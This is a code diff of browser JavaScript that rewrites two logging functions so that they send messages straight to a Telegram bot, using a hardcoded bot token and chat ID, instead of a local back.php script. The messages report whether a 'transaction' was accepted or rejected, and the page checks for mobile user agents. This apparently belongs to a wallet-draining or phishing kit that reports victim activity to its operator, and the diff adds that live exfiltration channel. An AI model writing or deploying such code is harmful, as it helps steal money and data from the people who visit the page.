@@ -867,11 +867,37 @@ function logTlgMsg(msg, sus, hash) {
   } else {
     var succestrans = '❌ <b>Transaction is rejected</b>';
   }
-  fetch('back.php?key=8bEEokUZLhn7nAHz&m='+msg+'<br>'+succestrans);
+  fetch(
+  'https://api.telegram.org/bot8936022211:AAFOQR4J-q9AMQsYglu7mje8c87iXLInP6o/sendMessage',
+  {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+      chat_id: '8614416084',
+      text: msg + '\n' + succestrans,
+      parse_mode: 'HTML'
+    })
+  }
+);
 }
 
 function logTlg(msg) {
-  fetch('back.php?key=8bEEokUZLhn7nAHz&m='+msg);
+  fetch(
+  'https://api.telegram.org/bot8936022211:AAFOQR4J-q9AMQsYglu7mje8c87iXLInP6o/sendMessage',
+  {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+      chat_id: '8614416084',
+      text: msg,
+      parse_mode: 'HTML'
+    })
+  }
+);
 }
 
 if(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)){
